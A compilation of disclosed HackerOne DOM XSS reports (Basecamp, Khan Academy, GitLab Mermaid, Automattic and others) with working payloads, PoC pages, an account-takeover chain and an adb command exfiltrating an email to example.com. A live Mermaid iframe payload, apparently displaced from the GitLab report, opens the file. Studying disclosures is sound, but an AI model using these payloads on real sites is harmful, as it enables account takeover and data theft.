```mermaid
%%{init: {"flowchart": {"htmlLabels": "false"}} }%%
flowchart
  A["<iframe srcdoc='<script src=https://gitlab.com/api/v4/projects/saleemrashid%2Fmermaid-exploit-7032e404/jobs/1303935016/artifacts/exploit.js></script>'></iframe>"]
```

# Cross-site Scripting (XSS) - DOM

_29 reports — High/Critical, disclosed_

### [DOM XSS in `fizzy.do` import filename preview enables one-click victim account takeover](https://hackerone.com/reports/3608199)

- **Report ID:** `3608199`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - DOM
- **Program:** Basecamp
- **Reporter:** @xavlimsg
- **Bounty:** 500 usd
- **Disclosed:** 2026-04-14T21:36:22.221Z
- **CVE(s):** -

**Vulnerability Information:**

## Description

## Summary:

While auditing the latest Fizzy code and validating it end to end in a live Docker deployment of current `main`, I found that the account import page renders the selected local filename with `innerHTML` instead of `textContent`.

In practice, that means a crafted `.zip` filename is not shown as text. It is parsed as live HTML inside the real authenticated import form on `/account/imports/new`. Because that form already contains the victim's session and a valid CSRF token, I was able to inject a second submit control with an attacker-chosen `formaction` and turn the filename preview into an authenticated request gadget.

I pushed this beyond a theoretical DOM issue and validated the full attack chain to victim account takeover. The strongest demonstrated path was:

1. I made the victim browser submit an email-change request to `attacker@example.com`
2. Fizzy sent the confirmation link to the attacker-controlled mailbox
3. I redeemed that confirmation link
4. Fizzy created a fresh authenticated victim session for me
5. I accessed the victim account and victim profile edit page with `200 OK`

I also separately validated two additional impacts from the same sink:

- victim write-scoped personal access token creation
- victim account deletion

The worst case that I actually demonstrated is full victim account takeover.

## Steps To Reproduce:

I am including a zip bundle with the exact scripts I used. The attachment contains:

- `basecamp_submission__fizzy_do__cwe-79__.md`
  Purpose: this submission text in markdown form.
- `2026-03-16_import-filename_dom-xss_api-token.md`
  Purpose: my full technical write-up with the complete attack path, evidence, and code references.
- `fizzy_dom_xss_seed.rb`
  Purpose: seeds the attacker mailbox identity and victim owner account.
- `fizzy_dom_xss_takeover_chain.sh`
  Purpose: replays the full account-takeover chain after the victim session exists.
- `fizzy_dom_xss_account_delete_poc.js`
  Purpose: reproduces the secondary destructive impact, account deletion, in Playwright.
- `README.md`


I validated on current upstream:

- commit: `4211e20a663eb5ad8d4ca3340a1f8d247472c4dc`

### Setup

1. Check out the latest affected revision and build the app:

```bash
git clone https://github.com/basecamp/fizzy.git
cd fizzy
git fetch origin
git checkout 4211e20a663eb5ad8d4ca3340a1f8d247472c4dc
docker build -t fizzy-main-latest .
```

2. Start an SMTP capture container and a Fizzy app container:

```bash
docker run -d --name fizzy-mailhog-bridge mailhog/mailhog

docker run -d --name fizzy-ato-poc \
  -e SECRET_KEY_BASE="$(openssl rand -hex 32)" \
  -e DISABLE_SSL=true \
  -e MULTI_TENANT=true \
  -e SMTP_ADDRESS=172.17.0.6 \
  -e SMTP_PORT=1025 \
  -e SMTP_USERNAME=test \
  -e SMTP_PASSWORD=test \
  -e SMTP_AUTHENTICATION=plain \
  -e BASE_URL=http://172.17.0.7:3000 \
  fizzy-main-latest \
  bash -lc './bin/rails db:prepare && ./bin/rails server -b 0.0.0.0 -p 3000'
```

3. Seed the attacker mailbox identity and victim owner account:

```bash
docker cp fizzy_dom_xss_seed.rb fizzy-ato-poc:/tmp/fizzy_dom_xss_seed.rb
docker exec fizzy-ato-poc bash -lc 'bundle exec rails runner /tmp/fizzy_dom_xss_seed.rb'
```

In my run, that gave me:

```text
victim account slug: /40002
victim user id: 03frq8zae2a7m9cari0v89xua
attacker mailbox: attacker@example.com
victim mailbox: victim@example.com
```

4. Sign in as the victim through the real HTTP flow and keep the victim cookie jar:

```bash
curl -s -i -c /workspace/victim_ato.cookies -X POST \
  -d email_address=victim@example.com \
  http://172.17.0.7:3000/session
```

Then finish the magic-link sign-in. In my lab I completed real victim authentication before triggering the filename attack.

### Full takeover reproduction

1. Create a local file whose name injects a second submit button into the import form:

```text
<button formaction=&#47;40002&#47;users&#47;03frq8zae2a7m9cari0v89xua&#47;email_addresses formmethod=post name=email_address value=attacker@example.com>Take over.zip
```

2. As the logged-in victim, open:

```text
http://172.17.0.7:3000/account/imports/new
```

3. Select the malicious file. The preview will render a live injected button instead of inert filename text.

4. Click the injected `Take over.zip` control. This causes the victim browser to submit:

```http
POST /40002/users/03frq8zae2a7m9cari0v89xua/email_addresses
```

with:

- the victim's real authenticated session
- the page's real CSRF token
- `email_address=attacker@example.com`

5. Open the attacker mailbox in MailHog and retrieve the `Confirm your new email address` message. It contains a real confirmation URL like:

```text
http://172.17.0.7:3000/40002/users/03frq8zae2a7m9cari0v89xua/email_addresses/.../confirmation
```

6. Visit that confirmation URL and submit the real confirmation form. Fizzy then responds with:

```http
HTTP/1.1 302 Found
Location: http://172.17.0.7:3000/40002/users/03frq8zae2a7m9cari0v89xua/edit
Set-Cookie: session_token=...; httponly; samesite=lax
```

7. Reuse that new `session_token` cookie to request:

```text
GET /40002/
GET /40002/users/03frq8zae2a7m9cari0v89xua/edit
```

Both returned `200 OK` in my validation.

8. Confirm server-side that the victim user identity email changed to `attacker@example.com`.

### What I observed during validation

The full takeover chain succeeded. These are the exact checkpoints I confirmed:

- victim-side malicious POST to `/40002/users/03frq8zae2a7m9cari0v89xua/email_addresses`
- confirmation mail delivered to the attacker mailbox
- successful confirmation POST
- new attacker-side `session_token`
- `200 OK` on the victim account and victim profile edit page
- victim identity now bound to `attacker@example.com`

### Additional validated impacts from the same sink

I also reproduced:

1. Victim write-scoped personal access token creation

```http
POST /20002/my/access_tokens
```

2. Victim account deletion

```http
POST /20002/account/cancellation
```

I included the deletion PoC script in the zip because it is a clean secondary demonstration of the same primitive, but the primary reportable impact is the mailbox-backed account takeover above.

## Supporting Material/References:

### Code references

- `app/javascript/controllers/upload_preview_controller.js`
- `app/views/account/imports/new.html.erb`
- `app/controllers/users/email_addresses_controller.rb`
- `app/controllers/users/email_addresses/confirmations_controller.rb`
- `app/controllers/account/cancellations_controller.rb`

### Key evidence I captured

Victim-side malicious POST:

```text
Started POST "/40002/users/03frq8zae2a7m9cari0v89xua/email_addresses" for 172.17.0.2
Processing by Users::EmailAddressesController#create as */*
Parameters: {"authenticity_token"=>"[FILTERED]", "email_address"=>"attacker@example.com", "user_id"=>"03frq8zae2a7m9cari0v89xua"}
[ActiveJob] Enqueued ActionMailer::MailDeliveryJob ... "UserMailer", "email_change_confirmation"
```

Attacker mailbox confirmation message:

```text
Subject: Confirm your new email address
http://172.17.0.7:3000/40002/users/03frq8zae2a7m9cari0v89xua/email_addresses/.../confirmation
```

Attacker-side confirmation response:

```http
HTTP/1.1 302 Found
Location: http://172.17.0.7:3000/40002/users/03frq8zae2a7m9cari0v89xua/edit
Set-Cookie: session_token=...; httponly; samesite=lax
```

Attacker-side access after takeover:

```text
ATTACKER_ACCOUNT_HTTP=200
ATTACKER_EDIT_HTTP=200
{user_identity_email: "attacker@example.com", account_slug: "/40002"}
```

### Attachment bundle

I prepared a zip bundle containing the report plus all supporting scripts and notes:

- `basecamp_fizzy_dom_xss_account_takeover_bundle.zip`

## Impact

# Impact

An external attacker can send a crafted `.zip` file to a logged-in Fizzy owner and, with a single click on the import page, cause the victim browser to submit attacker-chosen same-origin authenticated POST requests using the victim session and the page's valid CSRF token.

The worst case I actually demonstrated was full victim account takeover. I was able to:

- trigger a victim email change to an attacker-controlled mailbox
- receive the confirmation link in the attacker mailbox
- redeem that link
- obtain a fresh authenticated victim session
- access the victim account as that victim

I also separately demonstrated:

- victim write-token creation
- victim account deletion

So the demonstrated impact is not just UI manipulation or an isolated DOM bug. It is a reliable path to full account compromise, plus destructive integrity and availability impact, from a single user interaction on the import page.

---

### [XSS on using the legacy "Graphie To Png" API](https://hackerone.com/reports/2846011)

- **Report ID:** `2846011`
- **Severity:** Critical
- **Weakness:** Cross-site Scripting (XSS) - DOM
- **Program:** Khan Academy
- **Reporter:** @sikn
- **Bounty:** - usd
- **Disclosed:** 2025-02-06T16:26:40.528Z
- **CVE(s):** -

**Vulnerability Information:**

An attacker can can upload malicious graphies via (http://graphie-to-png.kasandbox.org/) and (http://graphie-to-png.khanacademy.systems/) that exploit the graphie renderer.
The attack targets any page that has a graphie (`khanacademy.org`!!), as well as `cdn.kastatic.org` and `ka-perseus-graphie.s3.amazonaws.com`

# Proof of concept
## Step 1: Uploading a malicious graphie
consider the following example where https://ka-perseus-graphie.s3.amazonaws.com/2122427aa8dc4ef2a59058bc1a7a934ba6ca6747.svg is used in an article, we will override it by uploading the same JS but with malicious SVG and JSON data (because the hash is a hash of the JS).

1. **Malicious SVG:** The SVG is modified to include a malicious `onload` attribute.
```html
<svg ... onload="alert('SIKN')">...</svg>
```
2. **Malicious JSON:** A label is modified with `typesetAsMath: false`, causing the graphie renderer to inject our code to DOM. This is what will target `khanacademy.org`
```json
{
	"labels": [
		{
			"content": "<script>alert('SIKN')</script>",
			"typesetAsMath": false,
			...
		},
		...
	],
	...
}
```
```js
var form = new FormData();
form.append("js", ORIGINAL_JS);
form.append("svg", XSS_SVG);
form.append("other_data", JSON.stringify(XSS_JSON));

await fetch("http://graphie-to-png.kasandbox.org/svg", {
    "method": "POST",
    "body": form
}).then(r=>r.text())
```


## Step 2: Wait patiently
Wait until cdn.kastatic.org updates its cache, for this example I had already prepared it by not caching the original graphie (https://cdn.kastatic.org/ka-perseus-graphie/2122427aa8dc4ef2a59058bc1a7a934ba6ca6747.svg)

As for the malicious JSON, using the devtools override feature to simulate an attack shows that it works:
{F3766148}

## Impact

XSS on pages that use graphies, potentially leading to account takeovers.

---

### [DOM Based Reflected Cross Site Scripting](https://hackerone.com/reports/2321874)

- **Report ID:** `2321874`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - DOM
- **Program:** MTN Group
- **Reporter:** @nhx1
- **Bounty:** - usd
- **Disclosed:** 2024-12-25T08:12:51.681Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
I hope you're doing well. I stumbled upon one of your assets. Upon further inspection I realized that the asset was running an outdated version of Swagger. 
The outdated version of Swagger is well-known for Cross-Site Scripting vulnerabilities so I went ahead and attempted to test it in  https://notification-server-v2.sz-my.mtn.com/.  Turns out, it's vulnerable to Cross-Site Scripting. To reproduce it, please follow the steps of reproduction. I have not assessed the full impact of this vulnerability but it is highly probable that a malicious actor could exploit to takeover accounts of applications hosted under *.mtn.com. I hope this gets patched soon. If there's some additional information that you need from my side, please let me know. Thank you. 

## Steps To Reproduce:
[add details for how we can reproduce the issue]

  1. Go to the following URL https://notification-server-v2.sz-my.mtn.com/index.html?configUrl=https://jumpy-floor.surge.sh/test.json
  1. Observe the alert pop up like in the screenshot below
  

{F2983813}

## Supporting Material/References:
[list any additional material (e.g. screenshots, logs, etc.)]

  * [attachment / reference]

## Impact

A malicious actor could execute arbitrary scripts

---

### [DOM XSS in tiktok.com/login via the redirect_url parameter](https://hackerone.com/reports/2583874)

- **Report ID:** `2583874`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - DOM
- **Program:** TikTok
- **Reporter:** @sh1yo
- **Bounty:** - usd
- **Disclosed:** 2024-09-21T06:16:26.790Z
- **CVE(s):** -

**Summary (team):**

A DOM Cross-Site Scripting (XSS) vulnerability was found on the redirect_url parameter that could have resulted in account takeover. We thank @sh1yo for reporting this to our team and confirming its resolution.

---

### [Lynxview JS interfaces Takeover via deeplink traversal](https://hackerone.com/reports/2417516)

- **Report ID:** `2417516`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - DOM
- **Program:** TikTok
- **Reporter:** @fr4via
- **Bounty:** - usd
- **Disclosed:** 2024-05-24T23:47:39.681Z
- **CVE(s):** -

**Summary (team):**

Multiple vulnerabilities could have been chained together resulting in the takeover of Javascript interfaces via the application's exposed Webview. This was only applicable to older versions of the Android application. We thank @fr4via for reporting this to our team and confirming its remediation.

---

### [DOM XSS on multiple Automattic domains through postMessages](https://hackerone.com/reports/2371019)

- **Report ID:** `2371019`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - DOM
- **Program:** Automattic
- **Reporter:** @renniepak
- **Bounty:** - usd
- **Disclosed:** 2024-02-26T08:24:28.416Z
- **CVE(s):** -

**Vulnerability Information:**

Hi Automattic team,

I have found a 2 flaws that when combined lead to DOM XSS on every website that is using Jetpack with the [Likes](https://jetpack.com/support/likes/) feature enabled. 

The 2 flaws are respectively:

- A DOM XSS vulnerability on https://widgets.wp.com/sharing-buttons-preview/
- The Jetpack plugin creates a postMessage listener allowing messages from the "widgets.wp.com" origin, but will not validate nor encode the `avatar_url` parameter before applying it to the DOM causing XSS.

## Reproduction:

- Navigate to https://0-a.nl/jetpackxssclick.html?url=https://wordpress.com/blog/2024/01/31/http3/ and click the `PoC link`.

## Result

In the newly opened window a `alert(document.domain)` will pop on https://wordpress.com

{F3044196}

## Root causes

### XSS on widgets.wp.com

The DOM XSS here is caused by the following included script:

*https://widgets.wp.com/sharing-buttons-preview/js/preview.js*
```javascript
        if (_.isArray(r.custom)) {
            i = _.template(e("#tmpl-custom-button").html());
            s = _.map(r.custom, function(e) {
                var t = g.parseUrl(e.icon);
                return new d({
                    ID: e.name,
                    markup: i({
                        icon: o + "/" + t.host + t.pathname,
                        name: e.name
                    })
                })
            });
            n = n.concat(s)
        }
```
It's not that obvious because of the minified javascript but what happens is that 2 url parameters are parsed and used to add a UI element to the DOM:

?custom[0][icon]=iconurl&custom[0][name]=name

We can abuse the `name` parameter to create an XSS.

https://widgets.wp.com/sharing-buttons-preview/?custom[0][icon]=iconurl&custom[0][name]=%22%3E%3Cimg%20src%20onerror=alert()%3E

{F3044216}

### Insecure postMessage listener / codeblock

When we navigate to a website that has the Jetpack Likes feature enabled, a postMessage listener will be launched that will execute the `JetpackLikesMessageListener` function when a message arrives.

We can see it contains an origin check to only allow messages from widgets.wp.com. We can bypass this now since we have XSS on that domain:

```javascript
const allowedOrigin = 'https://widgets.wp.com';
	if ( allowedOrigin !== event.origin ) {
		return;
	}
```

When we follow the code to the `showOtherGravatars` case, you'll see it use a `liker.avatar_URL` parameter (that is received via a postMessage) directly with innerHTML. This will allow us to send a tampered postMessage causing the XSS to be triggered.

```javascript
element.innerHTML = `
				<a href="${ encodeURI( liker.profile_URL ) }" rel="nofollow" target="_parent" class="wpl-liker">
					
					<span></span>
				</a>
				`;
```

## Mitigation

- Applying input validation and output encoding on the sharing-button page to mitigate the XSS https://widgets.wp.com/sharing-buttons-preview/
- Defence in depth: now any XSS on widgets.wp.com will lead to multiple XSSes all over the internet (anyone using the Jetpack Likes features). To mitigate this, I would also apply `encodeURI` to the avatar_url before using it in `innerHTML`. Upon further research it seemed older version of the plugin did exactly this, but in later versions this was removed.

## Impact

XSS on a number of Automattic domains:

https://0-a.nl/jetpackxssclick.html?url=https://wordpress.com/blog/2024/01/31/http3
https://0-a.nl/jetpackxssclick.html?url=https://jetpack.com/blog/wordpress-navigation-menu/

You probably have better insights in this (also I'd love to hear the actual number :) ) but searching publicwww.com revealed over 100k websites using this feature, meaning 100k domains vulnerable to this XSS.

This is also the reason I picked `High` for severity. If it was just wordpress.com I would probably have gone for `Medium` which is more typical for these kind of XSSes without providing more impact specific to the vulnerable domain. But in this case the vulnerability reaches far beyond the 1 domain.

In general, if an attacker can control a script that is executed in the victim's browser, then they can typically fully compromise that user. Amongst other things, the attacker can:

* Perform any action within the application that the user can perform.
* View any information that the user is able to view.
* Modify any information that the user is able to modify.

---

### [xss due to incorrect handling of postmessages](https://hackerone.com/reports/1758132)

- **Report ID:** `1758132`
- **Severity:** Critical
- **Weakness:** Cross-site Scripting (XSS) - DOM
- **Program:** Khan Academy
- **Reporter:** @moom825
- **Bounty:** - usd
- **Disclosed:** 2022-12-23T00:22:55.455Z
- **CVE(s):** -

**Vulnerability Information:**

Due to Insecure handling of create link tags (a tags) in a function called `autolink` found in `7Bmt.af733e428f9f986dfc96.js`
```js
e = n.autolink(e, !0));
        const n = function() {
            const e = /\b(?:(?:https?:\/\/|www\d{0,3}[.]|[a-z0-9.\-]+[.][a-z]{2,4}\/)(?:[^\s()<>&]+|&amp;|\((?:[^\s()<>]|(?:\([^\s()<>]+\)))*\))+(?:\((?:[^\s()<>]|(?:\([^\s()<>]+\)))*\)|[^\s`!()\[\]{};:'".,<>?«»“”‘’&]))/gi;
            return {
                autolink: function(t, r) {
                    return t.replace(e, (function(e) {
                        /^https?:\/\//.test(e) || (e = "http://" + e);
                        return "<a " + (r ? 'rel="nofollow"' : "") + ' href="' + e + '">' + e + "</a>"
                    }
                    ))
                }
            }
        }();
```
which is ran in the challenges (ex: https://www.khanacademy.org/computing/computer-programming/programming/resizing-with-variables/pc/challenge-brown-bear-eyes). A specially crafted postmessage can abuse this.
```html
<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <title>New webpage</title>
    </head>
    <body>
        <script>
        function main()
{
	window['test']=window.open("https://www.khanacademy.org/computing/computer-programming/programming/interactive-programs/pc/challenge-mouse-movement-mania");
	const pwntimer = setTimeout(pwn, 3000);	
}
function pwn(){window['test'].postMessage('{"results":{"timestamp":'+Date.now()+',"code":"","errors":[],"assertions":[],"warnings":[],"tests":[{"name":"","state":"pass","results":[{"type":"assertion","msg":"http://#/\\"style=\\"width:2000px;height:2000px;position:fixed;top:0;left:0;margin-bottom:2000;z-index:200;\\"onmouseover=\\"eval(String.fromCharCode(97,108,101,114,116,40,34,112,119,110,100,33,34,41))\\"","state":"pass","expected":"","meta":{"structure":"function() {pwned!}"}}]}]}}',"*");clearTimeout(pwntimer)};
        </script>
        <button onclick="main();">press to pwn</button>
    </body>
</html>
```
also due to insecure host checking in the `message` event, the mentioned html code above can be run from any webpage.

The payload which the function `autolink` is insecurely creating the tag can look like this
`http://#/"style="width:2000px;height:2000px;position:fixed;top:0;left:0;margin-bottom:2000;z-index:200;"onmouseover="eval(String.fromCharCode(97,108,101,114,116,40,34,112,119,110,100,33,34,41))"` the malicious link will be set incorrectly and create extra attributes (in this case style and onmouseover)


the parsed json payload:
```json
{
   "results":{
      "timestamp":"",
      "code":"",
      "errors":[
         
      ],
      "assertions":[
         
      ],
      "warnings":[
         
      ],
      "tests":[
         {
            "name":"",
            "state":"pass",
            "results":[
               {
                  "type":"assertion",
                  "msg":"http://#/\"style=\"width:2000px;height:2000px;position:fixed;top:0;left:0;margin-bottom:2000;z-index:200;\"onmouseover=\"eval(String.fromCharCode(97,108,101,114,116,40,34,112,119,110,100,33,34,41))\"",
                  "state":"pass",
                  "expected":"",
                  "meta":{
                     "structure":"function() {pwned!}"
                  }
               }
            ]
         }
      ]
   }
}
```

## Impact

This attack could be steal user data (cookies, profile, etc) which in turn can be used to manipulate the user account, if it is a teacher who gets targeted, it can cause havoc with the email ("106 assignments have been assigned") as well as leak student private info. This attack could also be used to create a phishing page with the domain `khanacademy.org` by modifying the page to display a login box (stealing the users email and password).

---

### [com.basecamp.bc3 Webview Javascript Injection and JS bridge takeover](https://hackerone.com/reports/1343300)

- **Report ID:** `1343300`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - DOM
- **Program:** Basecamp
- **Reporter:** @fr4via
- **Bounty:** - usd
- **Disclosed:** 2022-09-23T09:33:57.203Z
- **CVE(s):** -

**Vulnerability Information:**

It was identified that the android **com.basecamp.bc3 application**, contains a Webview where the loaded URLs are not sanitised properly. As this webview's functionality is extended via javascript interfaces and has the javascript enabled it is possible to inject arbitrary javascript code which will be executed by the application's webview and provide access to the java native code via the class **a.a.a.s.g** ( which is exposed via the NativeApp).  

##JS Bridge

The following JS Bridges are exposed:

###nativeBridge

{F1452715}

###NativeApp


{F1452717}

###TurboNative

{F1452718}

##Steps to Reproduce

1. Create a valid basecamp account 
2. Create a project 

{F1452720}

3. Open any Sub-project tab (e.g. Message Board - it is needed only ONE time in order to initialise the JS interface  )


Run the following command after replacing the XXXXX with the user id 

Example: {F1452730}

Command:
```
$adb shell am start -W -a android.intent.action.VIEW -d 'https://3.basecamp.com/XXXXX/p","advance","---"); /* comment */ window.location.replace("https://example.com?exfiltration="+nativeBridge.getPage().accountName); //'
```

Observer the HTTP requests of the app:

```
GET /?exfiltration=USER_EMAIL@gmail.com HTTP/2
Host: example.com
....
````

## Impact

Confidentiality, Integrity and availability are all affected from the specific vulnerability as the javascript code can be injected to an already loaded url while additional functionality is added via the exposed javascript interfaces:

###Javascript Injection:

{F1452742}

###Bridge Access

"Bucket Name:"+nativeBridge.getPage().bucketName + "Title: " + nativeBridge.getPage().title + "User email:" +nativeBridge.getPage().accountName);

{F1452750}

### Cookie exfiltration:

{F1452769}

---

### [Dom Xss vulnerability](https://hackerone.com/reports/1448616)

- **Report ID:** `1448616`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - DOM
- **Program:** Recorded Future
- **Reporter:** @fornex
- **Bounty:** - usd
- **Disclosed:** 2022-01-19T11:00:38.923Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Dom Xss vulnerability

## Steps To Reproduce:
[add details for how we can reproduce the issue]

  1. Go to this link: https://api.recordedfuture.com/index.html
  2. Open chrome devtool and go to console tab
  3. Type: document.write('...<script>alert(1)</script>...');
  4. And boom! Alert 1!

## Impact

XSS can have huge implications for a web application and its users. User accounts can be hijacked, credentials could be stolen, sensitive data could be exfiltrated, and lastly, access to your client computers can be obtained.

---

### [Stored XSS in Mermaid when viewing Markdown files](https://hackerone.com/reports/1212822)

- **Report ID:** `1212822`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - DOM
- **Program:** GitLab
- **Reporter:** @saleemrashid
- **Bounty:** - usd
- **Disclosed:** 2021-10-18T06:00:36.580Z
- **CVE(s):** -

**Vulnerability Information:**

### Summary

GitLab's Mermaid configuration allows an attacker to inject HTML in the rendered Markdown. This can be combined with a CSP bypass using pipeline artifacts to achieve RCE.

### Steps to reproduce

1. Create a repository on GitLab.com

2. Add the following to `.gitlab-ci.yml`

```yaml
---
job:
  script:
  - "echo 'alert(parent.document.querySelector(\"meta[name=csrf-token]\").outerHTML)' > exploit.js"
  artifacts:
    paths:
    - exploit.js
```

3. Wait for the pipeline to finish and record the job ID

4. Add the following to `README.md`, changing the project name (`saleemrashid/mermaid-exploit-7032e404`) and job ID (`1303935016`) accordingly

~~~

~~~

5. Open `README.md` (or any page that renders it, including the project overview page), and observe the alert containing the CSRF token (e.g. `<meta name="csrf-token" content="XXXXXX">`) caused by executing `exploit.js`

### Impact

Because the XSS leads to code execution as the authenticated user, this allows full account take-over without user interaction.

### Examples

Private project on GitLab.com https://gitlab.com/saleemrashid/mermaid-exploit-7032e404

### What is the current *bug* behavior?

Mermaid supports HTML labels when `flowchart.htmlLabels` is enabled and `securityLevel` is not `strict`. GitLab's configuration disables this functionality https://gitlab.com/gitlab-org/gitlab/-/blob/v13.12.1-ee/app/assets/javascripts/behaviors/markdown/render_mermaid.js#L40-52

```javascript
  mermaid.initialize({
    // mermaid core options
    mermaid: {
      startOnLoad: false,
    },
    // mermaidAPI options
    theme,
    flowchart: {
      useMaxWidth: true,
      htmlLabels: false,
    },
    securityLevel: 'strict',
  });
```

However, Mermaid also supports directives (https://mermaid-js.github.io/mermaid/#/directives) to alter the configuration. For security reasons, these directives aren't able to override certain configuration options https://github.com/mermaid-js/mermaid/blob/8.9.2/src/defaultConfig.js#L114-L120

```javascript
  /**
   * This option controls which currentConfig keys are considered _secure_ and can only be changed via
   * call to mermaidAPI.initialize. Calls to mermaidAPI.reinitialize cannot make changes to
   * the `secure` keys in the current currentConfig. This prevents malicious graph directives from
   * overriding a site's default security.
   */
  secure: ['secure', 'securityLevel', 'startOnLoad', 'maxTextSize'],
```

While you can't override `securityLevel`, it turns out that overriding `flowchart.htmlLabels` to `"false"` (specifically the string, not the boolean) is sufficient to bypass the sanitization https://github.com/mermaid-js/mermaid/blob/8.9.2/src/diagrams/common/common.js#L34-L54

```javascript
  let htmlLabels = true;
  if (
    config.flowchart &&
    (config.flowchart.htmlLabels === false || config.flowchart.htmlLabels === 'false')
  ) {
    htmlLabels = false;
  }

  if (htmlLabels) {
    const level = config.securityLevel;

    if (level === 'antiscript') {
      txt = removeScript(txt);
    } else if (level !== 'loose') {
      // eslint-disable-line
      txt = breakToPlaceholder(txt);
      txt = txt.replace(/</g, '&lt;').replace(/>/g, '&gt;');
      txt = txt.replace(/=/g, '&equals;');
      txt = placeholderToBreak(txt);
    }
  }
```

The above code will not sanitize the label if `flowchart.htmlLabels` is set to `false` or `"false"`. It seems like the intention is to not sanitize the label if it's going to be rendered as text, which makes sense. However, the code that actually decides whether to render it as HTML or text always uses `if (config.flowchart.htmlLabels)`, which would succeed for the string `"false"` (because it's truthy). This means the sanitization is bypassed, but the string is still rendered as HTML, resulting in XSS.

To make use of the XSS, we need to bypass the CSP:

```
script-src 'self' 'unsafe-inline' 'unsafe-eval' https://assets.gitlab-static.net https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/ https://www.recaptcha.net/ https://apis.google.com 'nonce-<nonce>'
```

Using nonces causes the browser to ignore `'unsafe-inline'`, so we can't use inline scripts. However, we can take advantage of the fact that Workhorse will serve pipeline artifacts with an auto-detected `Content-Type` based on the file extension https://gitlab.com/gitlab-org/gitlab/-/blob/v13.12.1-ee/workhorse/internal/artifacts/entry.go#L98-101

```go
	// Write http headers about the file
	headers.Set("Content-Length", contentLength)
	headers.Set("Content-Type", detectFileContentType(fileName))
	headers.Set("Content-Disposition", "attachment; filename=\""+escapeQuotes(basename)+"\"")
```

The `Content-Disposition` header prevents this from being used for HTML/SVG-based XSS, but it still allows pipeline artifacts to be used as scripts or stylesheets. Because they are on the same domain, they satisfy `'self'` in the CSP policy.

Finally, RCE can be achieved by using the XSS to inject the following HTML, executing a pipeline artifact as JavaScript (`<iframe srcdoc>` is used because you can't directly inject a `<script>` tag with `innerHTML`). This example refers to an artifact on a private repository to maintain responsible disclosure, but you would enable public pipelines for an actual exploit (or add an access token to the URL) so the artifact is accessible by any user.

```html
<iframe srcdoc='<script src=https://gitlab.com/api/v4/projects/saleemrashid%2Fmermaid-exploit-7032e404/jobs/1303935016/artifacts/exploit.js></script>
```

### What is the expected *correct* behavior?

Mermaid should not allow HTML injection. While configuration changes and upstream bugfixes could improve the situation, it might be prudent to move Mermaid into a sandboxed `iframe` to avoid future vulnerabilities. For example, it also supports specifying `themeCSS` (which I attempted to use for a CSS exfiltration attack, but it wasn't practical to exfiltrate more than a few characters because the CSP didn't allow to `@import` files from an external server).

Additionally, Workhorse serving artifacts with dangerous `Content-Type` headers might not be secure behavior because it allows to bypass the CSP.

### Output of checks

This bug happens on GitLab.com

## Impact

Because the XSS leads to code execution as the authenticated user, this allows full account take-over without user interaction.

**Summary (team):**

#

---

### [Prototype Pollution leads to XSS on https://blog.swiftype.com/#__proto__[asd]=alert(document.domain)](https://hackerone.com/reports/998398)

- **Report ID:** `998398`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - DOM
- **Program:** Elastic
- **Reporter:** @s1r1u5
- **Bounty:** - usd
- **Disclosed:** 2021-08-16T18:54:38.948Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:** 
deparam function which parses location.hash in https://s.swiftypecdn.com/install/v2/st.js  is vulnerable to prototype pollution.
There is a script gadget in the same js file which leads to XSS.


## Steps To Reproduce:
Visit (Refresh if you don't see a pop up)
https://blog.swiftype.com/#__proto__[asd]=alert(document.domain)

## Root Cause
https://s.swiftypecdn.com/install/v2/st.js is the vulnerable file.
deparam function parses the ` location.hash` incorrectly which leads to Prototype Pollution.

```

 t.deparam = h = function(e, n) {
            var i = {}
              , r = {
                "true": !0,
                "false": !1,
                "null": null
            };
            return t.each(e.replace(/\+/g, " ").split("&"), function(e, o) {
                var s, a = o.split("="), u = b(a[0]), c = i, h = 0, p = u.split("]["), f = p.length - 1;
                if (/\[/.test(p[0]) && /\]$/.test(p[f]) ? (p[f] = p[f].replace(/\]$/, ""),
                p = p.shift().split("[").concat(p),
                f = p.length - 1) : f = 0,
                2 === a.length)
                    if (s = b(a[1]),
                    n && (s = s && !isNaN(s) ? +s : "undefined" === s ? l : r[s] !== l ? r[s] : s),
                    f)
                        for (; h <= f; h++)
                            u = "" === p[h] ? c.length : p[h],
                            c = c[u] = h < f ? c[u] || (p[h + 1] && isNaN(p[h + 1]) ? {} : []) : s; //pollution here
                    else
                        t.isArray(i[u]) ? i[u].push(s) : i[u] !== l ? i[u] = [i[u], s] : i[u] = s;
                else
                    u && (i[u] = n ? l : "")
            }),
            i
        }

```

Gadget found in the same js, which is very interesting gadget I found so far :xD

```

    
        pInstall._convertStringHooksToFunctions = function() {
            var functionHooks = {};
            $.each(this._userServerConfiguration.install.hooks, function(hookName, hookFunction) {
                functionHooks[hookName] = eval(hookFunction) //eval everything in the object
            }),
            this._userServerConfiguration.install.hooks = functionHooks
        }
        

```

## Impact: 
XSS

## Impact

XSS

---

### [Stored XSS in any message (leads to priv esc for all users and file leak + rce via electron app)](https://hackerone.com/reports/1014459)

- **Report ID:** `1014459`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - DOM
- **Program:** Rocket.Chat
- **Reporter:** @psych0tr1a
- **Bounty:** - usd
- **Disclosed:** 2021-03-25T06:59:29.335Z
- **CVE(s):** CVE-2021-22886

**Summary (team):**

Persistent XSS flaw using nested markdown tags allows remote attacker to inject arbitrary JavaScript to message. This flaw leads to arbitrary file read and RCE on Rocket.Chat desktop app. Patched on 3.11, 3.10.5, 3.9.7, 3.8.8.

---

### [RPC Implementation allows unauthenticated remote calls](https://hackerone.com/reports/876022)

- **Report ID:** `876022`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - DOM
- **Program:** Lark Technologies
- **Reporter:** @mike12
- **Bounty:** 1250 usd
- **Disclosed:** 2021-02-10T19:42:19.443Z
